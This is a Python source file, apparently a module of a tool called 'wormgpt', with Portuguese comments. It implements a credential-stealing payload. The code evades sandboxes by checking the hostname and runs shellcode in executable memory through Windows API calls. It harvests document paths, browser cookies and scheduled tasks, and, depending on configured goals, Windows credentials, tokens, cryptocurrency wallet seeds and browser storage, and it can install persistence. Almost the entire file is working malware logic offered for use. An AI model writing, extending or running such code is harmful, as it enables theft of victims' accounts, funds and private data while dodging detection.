import os
import fnmatch
import platform
import socket
import ctypes
import time
import getpass
import subprocess
import browser_cookie3
import json

# 🔥 IMPORTS DAS FUNÇÕES AVANÇADAS
from wormgpt.utils.wincred import dump_wincred
from wormgpt.utils.tokens import find_tokens
from wormgpt.utils.wallets import find_wallet_seeds
from wormgpt.utils.storage import dump_browser_storage
from wormgpt.utils.persistence import install_persistence

def evade_sandbox():
    """Verifica se o host é sandbox ou VM (heurística básica)."""
    node = platform.uname().node.lower()
    if any(kw in node for kw in ["sandbox", "vm", "malware", "test"]):
        print("[🛡️] Ambiente suspeito detectado. Abortando execução.")
        return True
    return False

def allocate_and_execute():
    """Executa shellcode (NOP sled) em memória com ponteiros corretos."""
    shellcode = b"\x90" * 32  # NOPs

    # Constantes
    MEM_COMMIT = 0x1000
    PAGE_EXECUTE_READWRITE = 0x40

    kernel32 = ctypes.windll.kernel32
    addr = kernel32.VirtualAlloc(
        None,
        len(shellcode),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    )

    if not addr:
        raise OSError("[‼️] Erro ao alocar memória.")

    # Executa shellcode na memória
    ctypes.memmove(addr, shellcode, len(shellcode))

    thread = kernel32.CreateThread(
        None, 0,
        ctypes.c_void_p(addr),
        None, 0, None
    )

    if not thread:
        raise OSError("[‼️] Erro ao criar thread.")

    kernel32.WaitForSingleObject(thread, -1)

def find_docs():
    """Busca arquivos .docx e .pdf fora de pastas temporárias."""
    targets = []
    for root, _, files in os.walk("C:\\Users"):
        for ext in ["*.docx", "*.pdf"]:
            for name in fnmatch.filter(files, ext):
                full_path = os.path.join(root, name)
                if "temp" not in full_path.lower():
                    targets.append(full_path)
        if len(targets) >= 5:
            break
    return targets

def dump_browser_cookies():
    """Extrai cookies dos navegadores suportados."""
    cookies = []
    try:
        cj = browser_cookie3.load()
        for c in cj:
            cookies.append(f"{c.domain} - {c.name} = {c.value}")
    except Exception as e:
        cookies.append(f"[erro cookies] {e}")
    return cookies

def dump_schtasks():
    """Coleta tarefas agendadas (schtasks) visíveis para o usuário atual."""
    try:
        output = subprocess.check_output("schtasks", shell=True).decode("utf-8", errors="ignore")
        return output.splitlines()[:10]
    except:
        return ["[erro ao acessar tarefas]"]

def execute_payload(ip, goals=None):
    """Executa cadeia completa de coleta baseada nos objetivos definidos."""
    if evade_sandbox():
        return None

    allocate_and_execute()

    result = {
        "host": ip,
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "os": platform.platform(),
        "files_found": find_docs(),
        "cookies": dump_browser_cookies(),
        "schtasks": dump_schtasks(),
        "timestamp": time.ctime()
    }

    # 🔁 Mapeia objetivos dinamicamente
    if goals:
        for goal in goals:
            desc = goal["goal"].lower()

            if "credencial" in desc or "wincred" in desc:
                result["wincred"] = dump_wincred()

            if "token" in desc:
                result["tokens"] = find_tokens()

            if "wallet" in desc:
                result["wallet_seeds"] = find_wallet_seeds()

            if "sessionstorage" in desc:
                result["browser_storage"] = dump_browser_storage()

            if "persist" in desc:
                result["persistence_installed"] = install_persistence()

    # Exibe resultado para debug (pode comentar em prod)
    print(json.dumps(result, indent=2))
    return result
